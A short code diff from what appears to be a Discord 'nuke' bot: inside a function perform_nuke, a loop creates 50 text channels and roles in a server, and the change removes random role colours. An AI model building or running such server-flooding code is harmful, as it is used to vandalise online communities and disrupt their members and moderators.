@@ -62,7 +62,7 @@ async def perform_nuke(guild):
     for _ in range(50):
         try:
             await guild.create_text_channel(channel_name)
-            await guild.create_role(name=role_name,color=random.choice([discord.Color.red(),discord.Color.orange(),discord.Color.yellow(),discord.Color.green(),discord.Color.blue(),discord.Color.purple()]))
+            await guild.create_role(name=role_name)
         except:
             pass
 
